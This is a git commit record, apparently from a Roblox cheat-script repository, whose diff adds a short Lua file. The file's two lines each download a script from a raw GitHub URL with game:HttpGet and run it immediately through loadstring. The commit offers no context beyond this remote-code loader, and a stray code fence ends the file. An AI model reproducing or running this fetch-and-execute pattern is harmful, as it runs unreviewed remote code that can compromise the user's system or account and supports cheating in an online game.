a190dd91af73a12bccb40b2134b944cd4bd9352a
GAGscriptPonyo <ladierocharles@gmail.com>
2025-07-29 16:31:19 +0800

    Update.lua

---
+++ updated.lua
@@ -0,0 +1,6 @@
+-- First loadstring
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ThundarZ/Welcome/refs/heads/main/Main/GaG/Main.lua"))()
+
+-- Second loadstring
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GAGscriptPonyo/ZenUpdate/refs/heads/main/New.lua"))()
+```
